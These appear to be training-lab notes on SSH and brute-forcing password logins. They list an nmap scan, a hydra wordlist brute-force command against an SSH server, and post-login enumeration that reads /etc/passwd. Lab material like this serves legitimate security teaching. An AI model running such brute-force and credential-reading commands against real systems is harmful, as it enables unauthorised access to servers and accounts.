- SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.
- It is typically used for remote access to servers and systems.
- SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
- SSH authentication can be configured in two ways:
	- Username & password authentication
	- Key based authentication
- In the case of username and password authentication, we can perform a brute-force attack on the SSH server in order to identify legitimate credentials and consequently gain access to the target system.

Practical Demonstration
- `nmap -sV demo.ine.local`
- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ssh`
- `ssh sysadmin@demo.ine.local`
	- `whoami`
	- `groups sysadmin`
	- `cat /etc/*issue`
	- `uname -r`
	- `cat /etc/passwd`
	- `ls`
